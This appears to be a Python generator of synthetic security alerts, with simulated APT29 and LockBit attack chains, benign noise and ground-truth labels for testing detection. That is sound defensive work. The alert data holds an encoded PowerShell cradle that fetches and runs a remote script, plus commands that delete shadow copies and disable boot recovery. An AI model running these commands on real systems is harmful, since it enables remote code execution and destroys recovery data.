"""Synthetic enterprise alert dataset generator for APT, Ransomware, WebShell, and Benign noise."""

import json
import random
from datetime import datetime, timedelta
from pathlib import Path
from typing import Any, Dict, List, Tuple
from core.schema import RawAlert


class AlertDatasetGenerator:
    """Generates realistic enterprise alert streams spanning multi-stage attacks and benign background noise."""

    @staticmethod
    def generate_apt29_scenario(base_time: datetime = None) -> List[RawAlert]:
        """Simulates APT29 (Cozy Bear) spearphishing, PowerShell cradle, process injection, and C2 beaconing."""
        if not base_time:
            base_time = datetime.utcnow() - timedelta(hours=2)

        alerts = [
            # 1. Spearphishing Attachment Drop
            RawAlert(
                source_type="sysmon",
                data={
                    "alert_id": "APT-01",
                    "EventID": 11,
                    "event_type": "FileCreate",
                    "timestamp": (base_time).isoformat(),
                    "host_name": "FIN-WORKSTATION-04",
                    "user_name": "CORP\\sarah.connor",
                    "TargetFilename": "C:\\Users\\sarah.connor\\Downloads\\Q3_Financial_Bonus_Report.pdf.exe",
                    "file_hash_sha256": "4a7d1ed414474e4033ac29ccb8653d9b4b60fd33ac79d3434685ff86a59963be",
                    "severity": "High",
                    "description": "Suspicious executable file created in Downloads folder mimicking PDF icon.",
                    "mitre_tactics": ["Initial Access"],
                    "mitre_techniques": ["T1566.001"]
                }
            ),
            # 2. PowerShell Execution & Download Cradle
            RawAlert(
                source_type="sysmon",
                data={
                    "alert_id": "APT-02",
                    "EventID": 1,
                    "event_type": "ProcessCreate",
                    "timestamp": (base_time + timedelta(minutes=3)).isoformat(),
                    "host_name": "FIN-WORKSTATION-04",
                    "user_name": "CORP\\sarah.connor",
                    "process_name": "powershell.exe",
                    "process_path": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
                    "process_command_line": "powershell.exe -nop -w hidden -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AMQA4ADUALgAyADIAMAAuADEAMAAxAC4ANQAvAGIAZQBhAGMAbwBuAC4AcABzADEAJwApAA==",
                    "parent_process_name": "Q3_Financial_Bonus_Report.pdf.exe",
                    "severity": "Critical",
                    "description": "Base64 encoded PowerShell execution spawned by downloaded executable.",
                    "mitre_tactics": ["Execution"],
                    "mitre_techniques": ["T1059.001"]
                }
            ),
            # 3. Process Injection into svchost / rundll32
            RawAlert(
                source_type="sysmon",
                data={
                    "alert_id": "APT-03",
                    "EventID": 10,
                    "event_type": "ProcessAccess",
                    "timestamp": (base_time + timedelta(minutes=5)).isoformat(),
                    "host_name": "FIN-WORKSTATION-04",
                    "user_name": "CORP\\sarah.connor",
                    "SourceImage": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
                    "TargetImage": "C:\\Windows\\System32\\rundll32.exe",
                    "GrantedAccess": "0x1F0FFF",
                    "CallTrace": "KERNEL32.DLL+0x1800|VirtualAllocEx|WriteProcessMemory|CreateRemoteThread",
                    "severity": "Critical",
                    "description": "Process injection detected: PowerShell allocated memory and created remote thread in rundll32.exe.",
                    "mitre_tactics": ["Defense Evasion", "Privilege Escalation"],
                    "mitre_techniques": ["T1055"]
                }
            ),
            # 4. Suricata C2 Beaconing Alert
            RawAlert(
                source_type="suricata",
                data={
                    "alert_id": "APT-04",
                    "event_type": "Alert",
                    "timestamp": (base_time + timedelta(minutes=8)).isoformat(),
                    "src_ip": "10.0.4.15",
                    "dst_ip": "185.220.101.5",
                    "src_port": 49820,
                    "dst_port": 443,
                    "proto": "TCP",
                    "host_name": "FIN-WORKSTATION-04",
                    "signature": "ET TROJAN Cobalt Strike Beacon Observed Over HTTPS",
                    "severity": "Critical",
                    "description": "High frequency heartbeat beaconing detected matching Cobalt Strike malleable C2 profile.",
                    "mitre_tactics": ["Command and Control"],
                    "mitre_techniques": ["T1071.001"]
                }
            )
        ]
        return alerts

    @staticmethod
    def generate_lockbit_scenario(base_time: datetime = None) -> List[RawAlert]:
        """Simulates LockBit 3.0 ransomware execution and shadow copy destruction."""
        if not base_time:
            base_time = datetime.utcnow() - timedelta(hours=1)

        alerts = [
            # 1. Suspicious Binary in Temp
            RawAlert(
                source_type="defender",
                data={
                    "alert_id": "LB-01",
                    "event_type": "ThreatDetected",
                    "timestamp": (base_time).isoformat(),
                    "host_name": "HR-SRV-01",
                    "user_name": "CORP\\admin_backup",
                    "process_name": "lockbit3_payload.exe",
                    "process_path": "C:\\Windows\\Temp\\lockbit3_payload.exe",
                    "file_hash_sha256": "e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855",
                    "severity": "High",
                    "description": "Unsigned high-entropy executable launched from Windows Temp directory.",
                    "mitre_tactics": ["Execution"],
                    "mitre_techniques": ["T1204.002"]
                }
            ),
            # 2. VSSAdmin Shadow Copy Deletion
            RawAlert(
                source_type="sysmon",
                data={
                    "alert_id": "LB-02",
                    "EventID": 1,
                    "event_type": "ProcessCreate",
                    "timestamp": (base_time + timedelta(seconds=25)).isoformat(),
                    "host_name": "HR-SRV-01",
                    "user_name": "CORP\\admin_backup",
                    "process_name": "vssadmin.exe",
                    "process_command_line": "vssadmin.exe Delete Shadows /All /Quiet",
                    "parent_process_name": "lockbit3_payload.exe",
                    "severity": "Critical",
                    "description": "Volume Shadow Copies deleted via vssadmin to inhibit recovery.",
                    "mitre_tactics": ["Impact", "Defense Evasion"],
                    "mitre_techniques": ["T1490"]
                }
            ),
            # 3. BCDEdit Recovery Disable
            RawAlert(
                source_type="sysmon",
                data={
                    "alert_id": "LB-03",
                    "EventID": 1,
                    "event_type": "ProcessCreate",
                    "timestamp": (base_time + timedelta(seconds=35)).isoformat(),
                    "host_name": "HR-SRV-01",
                    "user_name": "CORP\\admin_backup",
                    "process_name": "bcdedit.exe",
                    "process_command_line": "bcdedit /set {default} recoveryenabled No",
                    "parent_process_name": "lockbit3_payload.exe",
                    "severity": "Critical",
                    "description": "Windows boot recovery disabled by ransomware process.",
                    "mitre_tactics": ["Impact"],
                    "mitre_techniques": ["T1490"]
                }
            ),
            # 4. Rapid File Renaming & Ransom Note Drop
            RawAlert(
                source_type="sysmon",
                data={
                    "alert_id": "LB-04",
                    "EventID": 11,
                    "event_type": "FileCreate",
                    "timestamp": (base_time + timedelta(seconds=55)).isoformat(),
                    "host_name": "HR-SRV-01",
                    "user_name": "CORP\\admin_backup",
                    "TargetFilename": "C:\\Shares\\HR_Documents\\Restore-My-Files.txt",
                    "process_name": "lockbit3_payload.exe",
                    "severity": "Critical",
                    "description": "Bulk file modification and creation of Restore-My-Files.txt ransom note.",
                    "mitre_tactics": ["Impact"],
                    "mitre_techniques": ["T1486"]
                }
            )
        ]
        return alerts

    @staticmethod
    def generate_benign_noise(count: int = 10, base_time: datetime = None) -> List[RawAlert]:
        """Generates benign routine IT administration alerts, software updates, and vulnerability scanner noise."""
        if not base_time:
            base_time = datetime.utcnow() - timedelta(hours=3)

        alerts = []
        templates = [
            {
                "source_type": "sysmon",
                "event_type": "ProcessCreate",
                "host_name": "DC-PRIMARY-01",
                "user_name": "CORP\\svc_backup",
                "process_name": "wbadmin.exe",
                "process_command_line": "wbadmin.exe start systemstatebackup -backupTarget:\\\\BACKUP-NAS\\Daily",
                "severity": "Low",
                "description": "Authorized routine scheduled system state backup.",
                "mitre_tactics": []
            },
            {
                "source_type": "sysmon",
                "event_type": "ProcessCreate",
                "host_name": "DEV-LAPTOP-12",
                "user_name": "CORP\\alex.dev",
                "process_name": "powershell.exe",
                "process_command_line": "powershell.exe -Command Get-Service | Where-Object {$_.Status -eq 'Running'}",
                "severity": "Informational",
                "description": "Developer running standard PowerShell service query.",
                "mitre_tactics": []
            },
            {
                "source_type": "defender",
                "event_type": "ScanCompleted",
                "host_name": "ENG-WORKSTATION-08",
                "user_name": "NT AUTHORITY\\SYSTEM",
                "process_name": "MsMpEng.exe",
                "severity": "Informational",
                "description": "Windows Defender routine daily quick scan completed. 0 threats found.",
                "mitre_tactics": []
            },
            {
                "source_type": "suricata",
                "event_type": "Alert",
                "host_name": "DMZ-WEB-01",
                "src_ip": "10.0.100.50",
                "dst_ip": "10.0.1.10",
                "src_port": 54120,
                "dst_port": 80,
                "signature": "ET SCAN Vulnerability Scanner Probe (Nessus/Qualys)",
                "severity": "Low",
                "description": "Scheduled internal vulnerability scan probe detected from authorized scanner IP.",
                "mitre_tactics": []
            },
            {
                "source_type": "sysmon",
                "event_type": "ProcessCreate",
                "host_name": "IT-MGMT-02",
                "user_name": "CORP\\admin_jake",
                "process_name": "gpupdate.exe",
                "process_command_line": "gpupdate.exe /force",
                "severity": "Informational",
                "description": "Group Policy force refresh executed by sysadmin.",
                "mitre_tactics": []
            }
        ]

        for i in range(count):
            tpl = random.choice(templates).copy()
            t_offset = timedelta(minutes=random.randint(1, 120), seconds=random.randint(0, 59))
            tpl["alert_id"] = f"BENIGN-{i+1:03d}"
            tpl["timestamp"] = (base_time + t_offset).isoformat()
            alerts.append(RawAlert(source_type=tpl["source_type"], data=tpl))

        return alerts

    @classmethod
    def generate_mixed_dataset(cls, total_alerts: int = 50, noise_ratio: float = 0.6) -> Tuple[List[RawAlert], Dict[str, Any]]:
        """Constructs a realistic mixed alert stream with labeled ground truth."""
        base_time = datetime.utcnow() - timedelta(hours=4)
        
        apt_alerts = cls.generate_apt29_scenario(base_time + timedelta(minutes=15))
        ransom_alerts = cls.generate_lockbit_scenario(base_time + timedelta(minutes=45))
        
        attack_alerts = apt_alerts + ransom_alerts
        attack_count = len(attack_alerts)
        
        benign_count = max(5, total_alerts - attack_count)
        benign_alerts = cls.generate_benign_noise(benign_count, base_time)
        
        all_alerts = attack_alerts + benign_alerts
        # Sort chronologically
        all_alerts.sort(key=lambda a: a.data.get("timestamp", ""))

        ground_truth = {
            "total_alerts": len(all_alerts),
            "attack_alerts_count": attack_count,
            "benign_alerts_count": benign_count,
            "ground_truth_incidents": 2,  # APT29 + LockBit
            "expected_verdicts": {
                "FIN-WORKSTATION-04": "TruePositive",
                "HR-SRV-01": "TruePositive"
            }
        }

        return all_alerts, ground_truth

    @classmethod
    def save_sample_scenarios_to_disk(cls, target_dir: Path):
        """Saves pre-packaged scenario files to disk."""
        target_dir.mkdir(parents=True, exist_ok=True)
        
        apt = [a.model_dump(mode="json") for a in cls.generate_apt29_scenario()]
        (target_dir / "apt29_scenario.json").write_text(json.dumps(apt, indent=2), encoding="utf-8")
        
        lockbit = [a.model_dump(mode="json") for a in cls.generate_lockbit_scenario()]
        (target_dir / "lockbit_scenario.json").write_text(json.dumps(lockbit, indent=2), encoding="utf-8")
        
        benign = [a.model_dump(mode="json") for a in cls.generate_benign_noise(20)]
        (target_dir / "benign_noise.json").write_text(json.dumps(benign, indent=2), encoding="utf-8")
        
        mixed, _ = cls.generate_mixed_dataset(60, 0.7)
        mixed_json = [a.model_dump(mode="json") for a in mixed]
        (target_dir / "mixed_soc_stream.json").write_text(json.dumps(mixed_json, indent=2), encoding="utf-8")
